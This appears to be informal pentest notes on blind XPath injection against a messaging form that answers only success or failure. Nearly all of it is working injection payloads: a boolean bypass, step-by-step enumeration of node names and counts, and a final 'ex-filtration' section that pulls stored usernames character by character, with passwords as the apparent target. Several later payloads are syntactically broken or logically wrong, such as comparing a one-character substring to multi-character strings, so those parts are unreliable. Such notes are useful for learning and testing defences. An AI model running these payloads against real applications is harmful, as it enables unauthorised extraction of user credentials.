This is a XPATH injection that happens when we don't get a clear feedback back as response from the back end and likewise we need to guess the query based on true/false response. 
Take as an example a page that let's u message a user, if you send a message you get either success=if user exist or failure=if user don't exist, by playing around with query we can guess only by success of fail of our response.


## Check the APP behavior:
```
username=admin&message=Hello     (success if admin user exist)
username=pizda&message=Hello	  (should give you failure as pizda user don't exist)
```


## Check for injection possibility
```
username=pizda' or '1'='1&message=Hello     
```
(1=1 is always true and even if pizda don't exist we should be able to bypass and send the message anyway. In the back-end should translate to something similar `/users/user[username='invalid' or '1'='1']`)


## Now we meed to identify the Root node length, string wise
```
username=pizda' or string-length(name(/*[1]))=1 and '1'='1&message=Hello
.
username=pizda' or string-length(name(/*[1]))=2 and '1'='1&message=Hello
..
username=pizda' or string-length(name(/*[1]))=3 and '1'='1&message=Hello
...
username=pizda' or string-length(name(/*[1]))=8 and '1'='1&message=Hello
```
(iterate and change the ))=X integer to match the string length so you know how long will it be)


## When you got the string length you need to start by fuzzing the root-name string in same way. You should get success only for the combination that works like example (u..s..e..r..)
```
username=pizda' or substring(name(/*[1]),1,1)='u' and '1'='1&message=Hello
.
username=pizda' or substring(name(/*[1]),2,1)='s' and '1'='1&message=Hello
..
username=pizda' or substring(name(/*[1]),3,1)='e' and '1'='1&message=Hello
...
username=pizda' or substring(name(/*[1]),4,1)='r' and '1'='1&message=Hello
```


## Now that you got the root node name 
We need to identify the number of child nodes with count() function together with could notations 
**/ROOTNODENAME/*** which will be something like count**(/ROOTNOTE/*)=1**
```
username=pizda' or count(users/*)=1 and '1'='1&message=Hello
...
username=pizda' or count(/users/*)=2 and '1'='1&message=Hello

```
We found only 2 child elements(see them as rows in a table). We can see this as something like this:
```
<users>
	<user>
		XXX
		..
		XXX
	</user>
	<user>
		XXX
		..
		XXX
	</user>
</users>
```


## Next we need to find the length of the child name We can do same steps as before
Could child nodes length **/users/***
```
username=pizda' or string-length(name(/users/*[1]))=1 and '1'='1&message=Hello
.
username=pizda' or string-length(name(/users/*[1]))=2 and '1'='1&message=Hello
..
username=pizda' or string-length(name(/users/*[1]))=3 and '1'='1&message=Hello
...
```
(To target other siblings under same node use  **/users/*[2]** or  **/users/*[3]** etc)

Now that you have the length you need to identify the name new sub-strings
//When you got the string length you need to start by fuzzing the root-name string in same way. You should get success only for the combination that works like example (u..s..e..r..)
```
username=pizda' or substring(name(/users/*[1]))=user or '1'='1&message=Hello
.
username=pizda' or substring(name((/users/*[1]),1,1)=usern and '1'='1&message=Hello
..
username=pizda' or substring(name((/users/*[1]),2,1)=userna and '1'='1&message=Hello
...
username=pizda' or substring(name((/users/*[1]),3,1)=username and '1'='1&message=Hello
```
At the end you will have something similar:
```
<users>
	<user>
		<username>???</username>
		<password>???</password>
		<desc>???</desc>
	</user>
	<user>
		<username>???</username>
		<password>???</password>
		<desc>???</desc>
	</user>
</users>
```


## Lastly if ex-filtration time
```
username=pizda' or substring(/users/user[1]/username,1,1)='a' and '1'='1&message=Hello
.
username=pizda' or substring(/users/user[1]/username,2,1)='ab' and '1'='1&message=Hello
..
username=pizda' or substring(/users/user[1]/username,3,1)='abc' and '1'='1&message=Hello
...
username=pizda' or substring(/users/user[1]/username,4,1)='abcd' and '1'='1&message=Hello
```
